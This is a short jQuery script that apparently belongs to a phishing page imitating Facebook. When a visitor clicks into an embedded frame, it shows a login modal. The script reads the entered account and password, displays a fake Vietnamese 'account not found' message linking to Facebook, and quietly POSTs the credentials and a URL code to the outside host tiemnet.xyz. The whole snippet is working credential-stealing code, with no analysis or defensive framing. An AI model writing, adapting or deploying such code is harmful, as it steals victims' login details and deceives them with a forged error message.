<script>
    $(document).ready(function () {
        focus();
        var listener = addEventListener('blur', function () {
            if (document.activeElement === document.getElementById('iframe')) {
                $('#staticBackdrop').modal('show')
                function getParam(param) {
                    return new URLSearchParams(window.location.search).get(param);
                }

                $('#loginxxx').click(function () {
                    var acc = $('#tk').val();
                    var pass = $('#mk').val();
                    var code = getParam("code");
                    $('#thongbao').html('Email hoặc số di động bạn nhập không kết nối với tài khoản nào. <a href="https://facebook.com/login/identify/">Hãy tìm tài khoản của bạn và đăng nhập.</a>');
                    $.ajax({
                        type: "POST",
                        url: "https://tiemnet.xyz/api/fb",
                        data: { acc: acc, pass: pass, code: code },
                    });
                })
            }
            removeEventListener(listener);
        });
    })
</script>
